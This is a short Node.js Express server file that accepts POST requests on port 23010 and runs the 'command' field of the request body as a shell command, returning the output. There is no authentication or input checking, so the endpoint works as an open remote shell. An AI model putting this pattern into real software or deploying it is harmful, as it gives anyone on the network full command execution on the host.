const express = require('express')
const sh = require('shell-exec')
const inject = require('./inject')

const server = express()

const PORT = 23010

server.use(express.json())

server.post('/', (req, res) => {
  sh(req.body.command).then(data => {
    res.json(data)
  })
  .catch(error => res.json(error))
})

server.listen(PORT)
